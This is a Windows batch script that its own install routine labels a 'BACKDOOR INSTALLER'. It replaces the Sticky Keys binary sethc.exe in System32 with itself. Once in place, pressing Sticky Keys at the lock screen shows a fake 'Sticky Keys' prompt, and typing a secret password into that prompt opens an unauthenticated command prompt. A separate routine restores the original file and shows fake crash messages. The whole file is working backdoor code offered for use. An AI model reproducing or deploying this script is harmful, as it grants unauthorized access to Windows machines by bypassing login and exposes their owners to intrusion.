@echo off
if "%~1"=="" goto startIT
if "%~1"=="211" echo Launched VIA Windows! Getting Ready...&goto startIT
if /i "%~1"=="/install" goto :install
if /i "%~1"=="install" goto :install
if /i "%~1"=="i" goto :install
if /i "%~1"=="/i" goto :install
if /i "%~1"=="get" goto :install
:startIT
net file>nul 2>&1||goto :TryAndHide
echo Launching Fake "Sticky Keys" Window
%extd% /messagebox "Sticky Keys" "Do you want to turn on Sticky Keys?" 36
if "%result%"=="6" goto :InputYes
if "%result%"=="7" goto :InputNo
echo FAILED!! Unable To Detect "Sticky Keys" Window Input
%extd% /messagebox "Sticky Keys" "There was an error! (ERROR_CODE_3)" 16
goto :end
:InputNo
echo User Selected "No"
goto :end
:InputYes
echo User Selected "Yes", Loading Authentication Window...
set "result="
%extd% /inputbox "Sticky Keys" "Use the below box to enter the threshold for Sticky Keys" "$"
if "%result%"=="" %extd% /messagebox "Sticky Keys" "There was an error! (ERROR_CODE_4)" 16&goto :end
if /i "%result%"=="$uninstall$" goto :uninstall
if /i "%result%"=="$cmd$" pushd C:\Windows\SYSTEM32&goto :CMD
if /i "%result%"=="1234" start notepad&goto :end
if /i "%result%"=="$1234" start notepad&goto :end
if /i "%result%"=="$1234$" start notepad&goto :end
goto :end
:Uninstall
cmd /c start "Sticky Keys" cmd /c "mode con: cols=100 lines=30&color e0&echo.&echo Microsoft BIOS Error Reporting Tool&timeout -t 5&copy /Y C:\Windows\system32\sethc.exe C:\Windows\system32\sethc_patched.exe&del /F "C:\Windows\system32\sethc.exe"&copy /Y C:\Windows\system32\sethc2.exe C:\Windows\system32\sethc.exe&timeout /t 30 /nobreak&cls&echo CRITICAL WINDOWS ERROR!&echo Driver_Less_Or_Equal&timeout /t 120 /nobreak"
goto :end
:CMD
call start "Backdoor Command Prompt" cmd
goto :end
:TryAndHide
if exist "C:\windows\system32\sethc2.exe" start C:\windows\system32\sethc2.exe 211
goto end
:install
title BACKDOOR INSTALLER
set "NEWsethc=%~0"
%extd% /showself
echo.
prompt $S
cls&color f0
echo Press Any Key To Install
pause >nul
@echo on
@echo Checking If Backup Is Required...
if not exist "C:\windows\system32\sethc2.exe" copy C:\windows\system32\sethc.exe C:\windows\system32\sethc2.exe
@echo.&echo.&echo.
@echo Killing SETHC.exe (To Prevent Backdoor Lockout)
taskkill /f /im sethc.exe
@echo.&echo.&echo.
@echo Deleting Current SETHC.exe
del C:\windows\system32\sethc.exe
@echo.&echo.&echo.
@echo Copying Backdoor...
copy "%NEWsethc%" C:\windows\system32\sethc.exe
@echo.&echo.
@echo off
echo Press The Space Bar To Launch A CMD Console, Or Press 'X' To Exit
:Loop
pause >nul
start cmd
cls
echo Press The Space Bar To Launch A CMD Console, Or Press 'X' To Exit
goto :Loop
:end
exit